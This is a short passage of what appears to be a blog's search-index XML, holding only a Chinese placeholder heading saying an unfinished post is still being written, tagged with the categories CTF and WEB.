<h3 id="本文未完，博主正在加班加点编写中…"><a href="#本文未完，博主正在加班加点编写中…" class="headerlink" title="本文未完，博主正在加班加点编写中…"></a>本文未完，博主正在加班加点编写中…</h3>]]></content>
      <categories>
        <category>CTF</category>
        <category>WEB</category>
      </categories>
  </entry>
</search>
